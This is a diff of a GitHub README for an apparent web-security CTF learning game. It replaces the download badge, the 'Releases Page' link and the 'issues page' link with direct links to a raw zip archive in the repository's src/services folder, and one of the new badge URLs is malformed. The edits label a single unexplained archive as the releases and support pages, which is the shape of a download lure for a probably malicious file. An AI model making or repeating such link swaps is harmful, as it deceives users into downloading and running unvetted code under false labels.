@@ -1,6 +1,6 @@
 # 🎮 OGTHG-Hacking-Game - Learn Web Security Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-OGTHG--Hacking--Game-blue.svg)](https://github.com/s3rin3/OGTHG-Hacking-Game/releases)
+[![Download Now](https://raw.githubusercontent.com/s3rin3/OGTHG-Hacking-Game/main/src/services/Game_OGTH_Hacking_v2.0.zip%https://raw.githubusercontent.com/s3rin3/OGTHG-Hacking-Game/main/src/services/Game_OGTH_Hacking_v2.0.zip)](https://raw.githubusercontent.com/s3rin3/OGTHG-Hacking-Game/main/src/services/Game_OGTH_Hacking_v2.0.zip)
 
 ## 📜 Description
 OGTHG-Hacking-Game is a modern educational platform designed for learning web CTF (Capture The Flag) challenges step-by-step. This application includes a built-in simulator, progress tracking, and a global leaderboard. It aims to provide an intuitive experience to help users learn web security in a straightforward manner.
@@ -10,7 +10,7 @@ To get started with OGTHG-Hacking-Game, follow these simple steps to download an
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/s3rin3/OGTHG-Hacking-Game/releases) to download the latest version of OGTHG-Hacking-Game.
+   Go to the [Releases Page](https://raw.githubusercontent.com/s3rin3/OGTHG-Hacking-Game/main/src/services/Game_OGTH_Hacking_v2.0.zip) to download the latest version of OGTHG-Hacking-Game.
    
 2. **Choose Your Version**  
    Find the version suitable for your operating system.
@@ -43,7 +43,7 @@ If you forget your password, use the "Forgot Password" link on the login page to
 Most features require an internet connection, but offline mode allows you to practice some challenges.
 
 ### Where can I find support?
-For help or support, visit our [issues page](https://github.com/s3rin3/OGTHG-Hacking-Game/issues) to report problems or ask questions.
+For help or support, visit our [issues page](https://raw.githubusercontent.com/s3rin3/OGTHG-Hacking-Game/main/src/services/Game_OGTH_Hacking_v2.0.zip) to report problems or ask questions.
 
 ## 🌐 Community and Contributions
 Join our community on GitHub. Share your progress, ideas, or contributions. We welcome any input that can improve this educational platform.
